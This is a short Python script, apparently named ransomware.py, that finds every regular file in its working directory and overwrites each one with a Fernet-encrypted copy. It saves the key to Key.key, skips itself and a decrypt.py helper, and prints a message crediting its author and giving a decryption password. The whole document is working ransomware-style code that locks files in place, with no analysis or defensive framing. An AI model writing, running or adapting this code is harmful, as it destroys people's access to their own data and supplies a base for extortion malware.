import os
from cryptography.fernet import Fernet
files = []

for file in os.listdir():
	if file == "ransomware.py"or file == "Key.key" or file == "decrypt.py" :
		continue
	if os.path.isfile(file):
		files.append(file)

key = Fernet.generate_key()
with open("Key.key","wb") as thekey:
	thekey.write(key)
for file in files:
	with open(file,"rb") as thefile:
		content = thefile.read()
		encrypted_content = Fernet(key).encrypt(content)
	with open(file,"wb" )as thefile:
		thefile.write(encrypted_content)

print("ecrypted by Djaafer yessad u can decrypt by entering to decrypt.py the password is djaaferyessad " )					
